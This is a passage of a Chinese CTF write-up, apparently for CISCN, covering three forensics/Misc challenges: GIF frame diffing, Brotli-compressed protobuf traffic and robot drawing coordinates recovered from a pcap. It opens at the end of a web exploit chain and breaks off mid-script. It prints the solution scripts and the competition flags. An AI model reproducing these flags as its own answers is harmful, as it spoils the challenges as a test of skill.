<code>close()</code> 方法。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689184997/a5e58ec5d13cb4a7cfb485d37c6d736b3d16fdcf.png"></p><p>至此整个链条形成，写出如下脚本来生成利用的载荷。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running pixel"></a>running pixel</h3><p>使用 GIF Splitter 将动图逐帧提取出来，很容易将其分为十个动作三十七组。将每一组的一帧与上一组的同一帧作比较可以得出两个像素点的不同之处，以此类推将所有比较得出的不同点渲染在一张图片上。写出如下脚本达成目的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">PATH = <span class="string">&quot;C:/Users/lenovo/PycharmProjects/pyExp/pic/running_pixel.gif.ifl/IMG00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10 10 400</span></span><br><span class="line">image3 = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>, <span class="number">400</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        image1 = Image.<span class="built_in">open</span>(PATH + <span class="string">&quot;&#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i, j))</span><br><span class="line">        image2 = Image.<span class="built_in">open</span>(PATH + <span class="string">&quot;&#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i + <span class="number">1</span>, j))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Comapring &#123;:02d&#125;&#123;&#125;.bmp &#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i, j, i + <span class="number">1</span>, j))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">                <span class="keyword">if</span> image1.getpixel((y, x)) != image2.getpixel((y, x)):</span><br><span class="line">                    image3.putpixel((y, x), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(image1.getpixel((y, x))) + <span class="string">&quot; diff &quot;</span> + <span class="built_in">str</span>(image2.getpixel((y, x))))</span><br><span class="line">        image3.save(<span class="string">&quot;./pic2/result&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">image3.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本最终可以得到下图，将其顺时针旋转后再水平镜像。同时根据文件夹中的每一帧看出字符完成的先后顺序。按照顺序将字符拼合即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621115613757/c451ebfc4b8b9bb7d31e6a5eacdc17587f23e82c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</span><br></pre></td></tr></table></figure><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>筛选流量包中的 HTTP 流量，可以发现一部分响应中有 Brotli 的压缩流量。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621057373611/5a0f89a90ec5bdde41df3744c976415c82817fbb.png"></p><p>将传输的二进制文件导出，在 Linux 中通过 <code>yum install brotli</code> 安装 brotli 工具，使用 <code>brotli --stdout --decompress /root/data/extract.bin</code> 来解码内容。在 <code>/test</code> 路由的传输内容解码后可以得到如下 ProtoBuf3 结构。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBResponse</span> </span>&#123;</span><br><span class="line">  <span class="built_in">int32</span> code = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int64</span> flag_part_convert_to_hex_plz = <span class="number">2</span>;</span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">data</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> junk_data = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">string</span> flag_part = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">repeated</span> data dataList = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">int32</span> flag_part_plz_convert_to_hex = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">string</span> flag_last_part = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBRequest</span> </span>&#123;</span><br><span class="line">  <span class="built_in">string</span> cate_id = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int32</span> page = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">int32</span> pageSize = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>/secret</code> 下的二进制文件提取出来，准备反序列化。使用 protogen 生成 C# 的结构类，得到下列代码。</p><blockquote><p>protogen：<a href="https://protogen.marcgravell.com/">https://protogen.marcgravell.com/</a></p></blockquote><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;auto-generated&gt;</span></span><br><span class="line"><span class="comment">//   This file was generated by a tool; you should avoid making direct changes.</span></span><br><span class="line"><span class="comment">//   Consider using &#x27;partial classes&#x27; to extend these types</span></span><br><span class="line"><span class="comment">//   Input: my.proto</span></span><br><span class="line"><span class="comment">// &lt;/auto-generated&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">region</span> Designer generated code</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS0612, CS0618, CS1591, CS3021, IDE0079, IDE1006, RCS1036, RCS1057, RCS1085, RCS1192</span></span><br><span class="line">[<span class="meta">global::ProtoBuf.ProtoContract()</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">PBResponse</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">&#123;</span><br><span class="line">    private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">    global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">        =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;code&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Code &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;flag_part_convert_to_hex_plz&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">long</span> FlagPartConvertToHexPlz &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(3, Name = @<span class="meta-string">&quot;dataList&quot;</span>)</span>]</span><br><span class="line">    public global::System.Collections.Generic.List&lt;Data&gt; dataLists &#123; get; &#125; = new global::System.Collections.Generic.List&lt;Data&gt;();</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(4, Name = @<span class="meta-string">&quot;flag_part_plz_convert_to_hex&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> FlagPartPlzConvertToHex &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(5, Name = @<span class="meta-string">&quot;flag_last_part&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> FlagLastPart &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoContract(Name = @<span class="meta-string">&quot;data&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Data</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">    &#123;</span><br><span class="line">        private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">        global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">            =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">        [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;junk_data&quot;</span>)</span>]</span><br><span class="line">        [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> JunkData &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;flag_part&quot;</span>)</span>]</span><br><span class="line">        [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> FlagPart &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">global::ProtoBuf.ProtoContract()</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">PBRequest</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">&#123;</span><br><span class="line">    private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">    global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">        =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;cate_id&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> CateId &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;page&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Page &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(3)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> pageSize &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS0612, CS0618, CS1591, CS3021, IDE0079, IDE1006, RCS1036, RCS1057, RCS1085, RCS1192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endregion</span></span></span><br></pre></td></tr></table></figure><p>同样将得到的二进制文件先 Brotli 解压，使用 <a href="https://github.com/protobuf-net/protobuf-net">protobuf-net</a> 库编写代码来反序列化解压后获得的二进制文件。根据 ProtoBuf3 结构可以得知 flag 有几个部分，但是不知道顺序，调试之后可知 <code>dataLists</code> 中有两个元素，大致上根据 ProtoBuf3 结构中的数字排序之后可以得到 flag。编写脚本如下来获取 flag。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">PBResponse response = Serializer.Deserialize&lt;PBResponse&gt;(<span class="keyword">new</span> FileStream(<span class="string">@&quot;F:\extract.txt&quot;</span>, FileMode.Open));</span><br><span class="line">Console.WriteLine(<span class="string">&quot;CISCN&#123;&quot;</span> + Convert.ToString(response.FlagPartConvertToHexPlz, <span class="number">16</span>)</span><br><span class="line">                                           + response.dataLists[<span class="number">0</span>].FlagPart</span><br><span class="line">                                           + response.dataLists[<span class="number">1</span>].FlagPart</span><br><span class="line">                                           + Convert.ToString(response.FlagPartPlzConvertToHex, <span class="number">16</span>)</span><br><span class="line">                                           + response.FlagLastPart</span><br><span class="line">                                           + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</span><br></pre></td></tr></table></figure><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><blockquote><p>分析给出的机器人仿真程序和流量包，提取机器人控制程序控制机器人写出的字符串，flag为”CISCN{md5(机器人绘制的字符串)}</p></blockquote><p>使用 Wireshark 分析流量包，发现 TCP 流中存在数据传输。使用 <code>tshark.exe -r cap.pcapng -T fields -e data &gt; data.bin</code> 将数据分离出来。经过十六进制解码后可以发现其中存在着许多类似于 <code>[27,36,0]</code> 的数据，将其使用正则分离出来后处理成数组。使用如下脚本绘制图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">pixelsLocations = [[<span class="number">27</span>, <span class="number">36</span>], [<span class="number">28</span>, <span class="number">35</span>], [<span class="number">29</span>, <span class="number">35</span>], [<span class="number">31</span>, <span class="number">35</span>], [<span class="number">32</span>, <span class="number">35</span>], [<span class="number">33</span>, <span class="number">35</span>], [<span class="number">35</span>, <span class="number">35</span>], [<span class="number">36</span>, <span class="number">35</span>], [<span class="number">37</span>, <span class="number">35</span>], [<span class="number">39</span>, <span class="number">34</span>],</span><br><span class="line">    [<span class="number">40</span>, <span class="number">34</span>], [<span class="number">41</span>, <span class="number">33</span>], [<span class="number">42</span>, <span class="number">32</span>], [<span class="number">43</span>, <span class="number">32</span>], [<span class="number">45</span>, <span class="number">32</span>], [<span class="number">47</span>, <span class="number">31</span>], [<span class="number">48</span>, <span class="number">29</span>], [<span class="number">49</span>, <span class="number">28</span>], [<span class="number">49</span>, <span class="number">27</span>], [<span class="number">50</span>, <span class="number">26</span>],</span><br><span class="line">    [<span class="number">50</span>, <span class="number">25</span>], [<span class="number">51</span>, <span class="number">23</span>], [<span class="number">51</span>, <span class="number">22</span>], [<span class="number">51</span>, <span class="number">21</span>], [<span class="number">52</span>, <span class="number">20</span>], [<span class="number">52</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">18</span>], [<span class="number">52</span>, <span class="number">17</span>], [<span class="number">52</span>, <span class="number">16</span>], [<span class="number">52</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">51</span>, <span class="number">14</span>], [<span class="number">50</span>, <span class="number">14</span>], [<span class="number">49</span>, <span class="number">14</span>], [<span class="number">48</span>, <span class="number">14</span>], [<span class="number">47</span>, <span class="number">14</span>], [<span class="number">46</span>, <span class="number">14</span>], [<span class="number">45</span>, <span class="number">14</span>], [<span class="number">44</span>, <span class="number">14</span>], [<span class="number">43</span>, <span class="number">14</span>], [<span class="number">42</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">40</span>, <span class="number">14</span>], [<span class="number">39</span>, <span class="number">14</span>], [<span class="number">37</span>, <span class="number">14</span>], [<span class="number">35</span>, <span class="number">14</span>], [<span class="number">34</span>, <span class="number">14</span>], [<span class="number">32</span>, <span class="number">14</span>], [<span class="number">30</span>, <span class="number">14</span>], [<span class="number">28</span>, <span class="number">14</span>], [<span class="number">27</span>, <span class="number">14</span>], [<span class="number">26</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">25</span>, <span class="number">14</span>], [<span class="number">24</span>, <span class="number">14</span>], [<span class="number">23</span>, <span class="number">14</span>], [<span class="number">22</span>, <span class="number">14</span>], [<span class="number">21</span>, <span class="number">15</span>], [<span class="number">20</span>, <span class="number">16</span>], [<span class="number">19</span>, <span class="number">17</span>], [<span class="number">18</span>, <span class="number">19</span>], [<span class="number">18</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">    [<span class="number">18</span>, <span class="number">23</span>], [<span class="number">18</span>, <span class="number">24</span>], [<span class="number">18</span>, <span class="number">26</span>], [<span class="number">18</span>, <span class="number">27</span>], [<span class="number">18</span>, <span class="number">28</span>], [<span class="number">18</span>, <span class="number">30</span>], [<span class="number">18</span>, <span class="number">32</span>], [<span class="number">18</span>, <span class="number">33</span>], [<span class="number">18</span>, <span class="number">34</span>], [<span class="number">19</span>, <span class="number">37</span>],</span><br><span class="line">    [<span class="number">21</span>, <span class="number">39</span>], [<span class="number">21</span>, <span class="number">40</span>], [<span class="number">22</span>, <span class="number">42</span>], [<span class="number">24</span>, <span class="number">44</span>], [<span class="number">24</span>, <span class="number">45</span>], [<span class="number">26</span>, <span class="number">47</span>], [<span class="number">27</span>, <span class="number">48</span>], [<span class="number">28</span>, <span class="number">49</span>], [<span class="number">29</span>, <span class="number">50</span>], [<span class="number">30</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">31</span>, <span class="number">52</span>], [<span class="number">33</span>, <span class="number">53</span>], [<span class="number">34</span>, <span class="number">53</span>], [<span class="number">35</span>, <span class="number">54</span>], [<span class="number">36</span>, <span class="number">54</span>], [<span class="number">37</span>, <span class="number">54</span>], [<span class="number">38</span>, <span class="number">54</span>], [<span class="number">39</span>, <span class="number">54</span>], [<span class="number">40</span>, <span class="number">54</span>], [<span class="number">41</span>, <span class="number">54</span>],</span><br><span class="line">    [<span class="number">44</span>, <span class="number">54</span>], [<span class="number">46</span>, <span class="number">54</span>], [<span class="number">48</span>, <span class="number">54</span>], [<span class="number">50</span>, <span class="number">54</span>], [<span class="number">52</span>, <span class="number">53</span>], [<span class="number">53</span>, <span class="number">53</span>], [<span class="number">54</span>, <span class="number">52</span>], [<span class="number">55</span>, <span class="number">52</span>], [<span class="number">56</span>, <span class="number">52</span>], [<span class="number">58</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">59</span>, <span class="number">50</span>], [<span class="number">61</span>, <span class="number">49</span>], [<span class="number">62</span>, <span class="number">49</span>], [<span class="number">64</span>, <span class="number">47</span>], [<span class="number">65</span>, <span class="number">47</span>], [<span class="number">67</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">46</span>], [<span class="number">70</span>, <span class="number">45</span>], [<span class="number">71</span>, <span class="number">44</span>], [<span class="number">125</span>, <span class="number">23</span>],</span><br><span class="line">    [<span class="number">125</span>, <span class="number">23</span>], [<span class="number">124</span>, <span class="number">22</span>], [<span class="number">123</span>, <span class="number">22</span>], [<span class="number">121</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">20</span>], [<span class="number">115</span>, <span class="number">19</span>], [<span class="number">113</span>, <span class="number">19</span>], [<span class="number">112</span>, <span class="number">18</span>], [<span class="number">111</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">109</span>, <span class="number">17</span>], [<span class="number">106</span>, <span class="number">16</span>], [<span class="number">104</span>, <span class="number">16</span>], [<span class="number">103</span>, <span class="number">16</span>], [<span class="number">102</span>, <span class="number">15</span>], [<span class="number">101</span>, <span class="number">15</span>], [<span class="number">100</span>, <span class="number">15</span>], [<span class="number">99</span>, <span class="number">15</span>], [<span class="number">98</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">15</span>], [<span class="number">96</span>, <span class="number">15</span>], [<span class="number">95</span>, <span class="number">15</span>], [<span class="number">94</span>, <span class="number">15</span>], [<span class="number">93</span>, <span class="number">15</span>], [<span class="number">92</span>, <span class="number">15</span>], [<span class="number">91</span>, <span class="number">15</span>], [<span class="number">89</span>, <span class="number">15</span>], [<span class="number">87</span>, <span class="number">17</span>], [<span class="number">85</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">85</span>, <span class="number">19</span>], [<span class="number">84</span>, <span class="number">21</span>], [<span class="number">83</span>, <span class="number">21</span>], [<span class="number">82</span>, <span class="number">22</span>], [<span class="number">82</span>, <span class="number">23</span>], [<span class="number">81</span>, <span class="number">24</span>], [<span class="number">81</span>, <span class="number">26</span>], [<span class="number">80</span>, <span class="number">28</span>], [<span class="number">80</span>, <span class="number">29</span>], [<span class="number">80</span>, <span class="number">31</span>],</span><br><span class="line">    [<span class="number">80</span>, <span class="number">32</span>], [<span class="number">79</span>, <span class="number">34</span>], [<span class="number">79</span>, <span class="number">35</span>], [<span class="number">79</span>, <span class="number">37</span>], [<span class="number">79</span>, <span class="number">39</span>], [<span class="number">79</span>, <span class="number">41</span>], [<span class="number">79</span>, <span class="number">43</span>], [<span class="number">79</span>, <span class="number">44</span>], [<span class="number">79</span>, <span class="number">46</span>], [<span class="number">79</span>, <span class="number">47</span>],</span><br><span class="line">    [<span class="number">80</span>, <span class="number">48</span>], [<span class="number">81</span>, <span class="number">49</span>], [<span class="number">82</span>, <span class="number">50</span>], [<span class="number">84</span>, <span class="number">50</span>], [<span class="number">87</span>, <span class="number">51</span>], [<span class="number">88</span>, <span class="number">51</span>], [<span class="number">90</span>, <span class="number">51</span>], [<span class="number">91</span>, <span class="number">51</span>], [<span class="number">93</span>, <span class="number">51</span>], [<span class="number">94</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">51</span>], [<span class="number">100</span>, <span class="number">50</span>], [<span class="number">101</span>, <span class="number">49</span>], [<span class="number">102</span>, <span class="number">49</span>], [<span class="number">103</span>, <span class="number">48</span>], [<span class="number">105</span>, <span class="number">46</span>], [<span class="number">106</span>, <span class="number">45</span>], [<span class="number">108</span>, <span class="number">43</span>], [<span class="number">109</span>, <span class="number">42</span>],</span><br><span class="line">    [<span class="number">110</span>, <span class="number">41</span>], [<span class="number">111</span>, <span class="number">39</span>], [<span class="number">112</span>, <span class="number">38</span>], [<span class="number">112</span>, <span class="number">36</span>], [<span class="number">113</span>, <span class="number">34</span>], [<span class="number">114</span>, <span class="number">33</span>], [<span class="number">115</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">31</span>], [<span class="number">116</span>, <span class="number">30</span>],</span><br><span class="line">    [<span class="number">117</span>, <span class="number">28</span>], [<span class="number">118</span>, <span class="number">27</span>], [<span class="number">118</span>, <span class="number">28</span>], [<span class="number">117</span>, <span class="number">30</span>], [<span class="number">116</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">34</span>], [<span class="number">115</span>, <span class="number">36</span>], [<span class="number">114</span>, <span class="number">39</span>], [<span class="number">114</span>, <span class="number">41</span>],</span><br><span class="line">    [<span class="number">114</span>, <span class="number">43</span>], [<span class="number">114</span>, <span class="number">45</span>], [<span class="number">114</span>, <span class="number">47</span>], [<span class="number">114</span>, <span class="number">48</span>], [<span class="number">114</span>, <span class="number">50</span>], [<span class="number">114</span>, <span class="number">52</span>], [<span class="number">114</span>, <span class="number">53</span>], [<span class="number">115</span>, <span class="number">54</span>], [<span 